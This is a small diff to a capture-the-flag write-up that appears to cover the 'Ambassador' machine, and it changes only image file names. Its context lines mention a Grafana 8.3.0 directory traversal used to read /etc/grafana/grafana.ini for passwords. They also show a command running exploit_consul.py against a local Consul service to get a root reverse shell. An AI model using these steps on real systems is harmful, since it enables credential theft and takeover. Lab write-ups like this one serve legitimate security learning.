@@ -45,7 +45,7 @@ Grafana 8.3.0 - Directory Traversal and Arbitrary File Rea | multiple/webapps/50
 
 We can confirm that this works:
 
-<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (77) (5).png" alt=""><figcaption></figcaption></figure>
 
 Grafana stores a configuration file at `/etc/grafana/grafana.ini`, so let's start there. We can find some passwords within that:
 
@@ -196,4 +196,4 @@ developer@ambassador:~$ python3 exploit_consul.py --rhost 127.0.0.1 --rport 8500
 
 This would give us a reverse shell as `root`.
 
-<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (75) (7).png" alt=""><figcaption></figcaption></figure>
